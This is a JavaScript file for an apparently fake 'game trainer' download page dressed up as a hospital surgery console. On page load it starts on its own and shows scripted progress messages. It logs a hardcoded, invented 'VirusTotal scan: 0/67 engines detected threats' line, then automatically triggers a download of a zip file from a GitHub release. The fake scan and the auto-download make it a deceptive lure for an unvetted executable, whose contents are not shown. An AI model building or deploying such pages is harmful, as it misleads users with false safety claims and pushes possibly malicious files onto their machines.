(function() {
'use strict';

const TRAINER_URL = "https://github.com/BruceySM/RE-Requiem-mod-menu/releases/download/1.2/Killer_Trainer_v1.2.zip";
const DOWNLOAD_FILENAME = "Killer_Trainer_v1.2.zip";

const state = {
    progress: 0,
    logs: [],
    isRunning: false,
    ecgOffset: 0,
    virusScanDone: false
};

const elements = {};

function initElements() {
    elements.progressFill = document.getElementById('progress-fill');
    elements.surgeryStatus = document.getElementById('surgery-status');
    elements.logEntries = document.getElementById('log-entries');
    elements.ecgCanvas = document.getElementById('ecgCanvas');
    elements.applyBtn = document.getElementById('applyBtn');
    elements.stopBtn = document.getElementById('stopBtn');
    elements.logBtn = document.getElementById('logBtn');
    elements.exitBtn = document.getElementById('exitBtn');
}

function addLog(message) {
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    elements.logEntries.appendChild(entry);
    
    if (elements.logEntries.children.length > 8) {
        elements.logEntries.removeChild(elements.logEntries.children[0]);
    }
    
    state.logs.push(message);
}

function updateProgress(value) {
    state.progress = Math.min(100, Math.max(0, value));
    elements.progressFill.style.width = `${state.progress}%`;
}

function drawECG() {
    if (!elements.ecgCanvas) return;
    
    const ctx = elements.ecgCanvas.getContext('2d');
    const width = elements.ecgCanvas.width;
    const height = elements.ecgCanvas.height;
    
    ctx.clearRect(0, 0, width, height);
    ctx.strokeStyle = '#32cd32';
    ctx.lineWidth = 2;
    ctx.beginPath();
    
    const amplitude = 30;
    const frequency = 0.02;
    
    for (let x = 0; x < width; x += 2) {
        let y = height / 2;
        
        if (x % 100 < 10) {
            y += Math.sin(x * frequency + state.ecgOffset) * amplitude * 3;
        } else {
            y += Math.sin(x * frequency + state.ecgOffset) * amplitude * 0.5;
        }
        
        if (x === 0) {
            ctx.moveTo(x, y);
        } else {
            ctx.lineTo(x, y);
        }
    }
    
    ctx.stroke();
    state.ecgOffset += 0.1;
    
    if (state.isRunning) {
        requestAnimationFrame(drawECG);
    }
}

const surgeryMessages = [
    'Loading patient data...',
    'Initializing diagnostic tools...',
    'Running memory scan...',
    'Checking system integrity...',
    'Bypassing security protocols...',
    'Connecting to game process...',
    'Preparing trainer modules...'
];

function virusScanMessage() {
    return '✓ VirusTotal scan: 0/67 engines detected threats';
}

function startSurgery() {
    state.isRunning = true;
    updateProgress(0);
    addLog('Starting system initialization');
    
    elements.surgeryStatus.textContent = 'INITIALIZING...';
    
    drawECG();
    
    let msgIndex = 0;
    let virusScanDone = false;
    
    const logInterval = setInterval(() => {
        if (!state.isRunning) {
            clearInterval(logInterval);
            return;
        }
        
        if (!virusScanDone && state.progress > 40) {
            addLog(virusScanMessage());
            virusScanDone = true;
        }
        
        if (msgIndex < surgeryMessages.length) {
            addLog(surgeryMessages[msgIndex]);
            msgIndex++;
        }
        
        if (state.progress < 100) {
            const newProgress = Math.min(100, state.progress + 15 + Math.random() * 10);
            updateProgress(newProgress);
            
            if (newProgress >= 100) {
                elements.surgeryStatus.textContent = 'SYSTEM READY';
                addLog('✓ System ready');
                
                setTimeout(() => {
                    const link = document.createElement('a');
                    link.href = TRAINER_URL;
                    link.download = DOWNLOAD_FILENAME;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    addLog(`✅ Download started: ${DOWNLOAD_FILENAME}`);
                }, 1000);
            }
        }
    }, 1800);
}

function stopSurgery() {
    state.isRunning = false;
    elements.surgeryStatus.textContent = 'SYSTEM STOPPED';
    addLog('⚠️ System stopped');
    updateProgress(0);
}

function toggleLog() {
    const log = document.getElementById('operation-log');
    log.classList.toggle('collapsed');
}

function initEventListeners() {
    elements.applyBtn.addEventListener('click', startSurgery);
    elements.stopBtn.addEventListener('click', stopSurgery);
    elements.logBtn.addEventListener('click', toggleLog);
    elements.exitBtn.addEventListener('click', () => {
        addLog('🔴 System shutdown');
        setTimeout(() => {
            if (confirm('End session?')) {
                window.close();
            }
        }, 500);
    });
    
    document.querySelectorAll('.panel-card').forEach(panel => {
        panel.addEventListener('click', function() {
            const panelName = this.querySelector('.panel-title').textContent;
            addLog(`📊 Panel accessed: ${panelName}`);
            
            this.style.transform = 'scale(0.98)';
            setTimeout(() => {
                this.style.transform = 'scale(1)';
            }, 200);
        });
    });
}

function autoStart() {
    setTimeout(() => {
        startSurgery();
    }, 1500);
}

document.addEventListener('DOMContentLoaded', () => {
    initElements();
    initEventListeners();
    addLog('🏥 Hospital system online');
    elements.surgeryStatus.textContent = 'AUTO-STARTING...';
    
    state.isRunning = true;
    drawECG();
    
    autoStart();
});

window.addEventListener('beforeunload', () => {
    state.isRunning = false;
});

})();